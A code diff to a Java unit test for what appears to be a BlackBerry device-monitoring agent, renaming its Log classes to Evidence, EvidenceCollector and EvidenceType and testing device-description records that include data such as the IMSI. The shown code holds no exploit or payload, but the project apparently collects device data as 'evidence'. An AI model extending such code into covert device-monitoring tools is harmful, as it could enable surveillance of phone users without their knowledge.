@@ -12,11 +12,11 @@ package tests.unit;
 import blackberry.Device;
 import blackberry.Status;
 import blackberry.agent.Agent;
+import blackberry.evidence.Evidence;
+import blackberry.evidence.EvidenceCollector;
+import blackberry.evidence.EvidenceType;
 import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Path;
-import blackberry.log.Log;
-import blackberry.log.LogCollector;
-import blackberry.log.LogType;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
@@ -72,7 +72,7 @@ public final class UT_Log extends TestUnit {
 
         final Agent agent = Agent.factory(Agent.AGENT_DEVICE, true, Utils
                 .intToByteArray(0));
-        final Log agentLog = LogCollector.getInstance().factory(agent, true);
+        final Evidence agentLog = EvidenceCollector.getInstance().factory(agent, true);
 
         agentLog.createLog(null);
 
@@ -93,11 +93,11 @@ public final class UT_Log extends TestUnit {
         final Agent agent = Agent.factory(Agent.AGENT_DEVICE, true, Utils
                 .intToByteArray(0));
 
-        final Log agentLog = LogCollector.getInstance().factory(agent, true);
+        final Evidence agentLog = EvidenceCollector.getInstance().factory(agent, true);
 
         // agent device vuoto
         final byte[] additionalData = null;
-        byte[] plain = agentLog.makeDescription(additionalData, LogType.DEVICE);
+        byte[] plain = agentLog.makeDescription(additionalData, EvidenceType.DEVICE);
 
         //#ifdef DBC
         Check.asserts(plain.length >= 32, "Wrong len 1 ");
@@ -116,7 +116,7 @@ public final class UT_Log extends TestUnit {
         // agent device con imsi ecc
         device.refreshData();
 
-        plain = agentLog.makeDescription(additionalData, LogType.DEVICE);
+        plain = agentLog.makeDescription(additionalData, EvidenceType.DEVICE);
         //#ifdef DBC
         Check.asserts(plain.length > 32, "Wrong len 2");
         //#endif
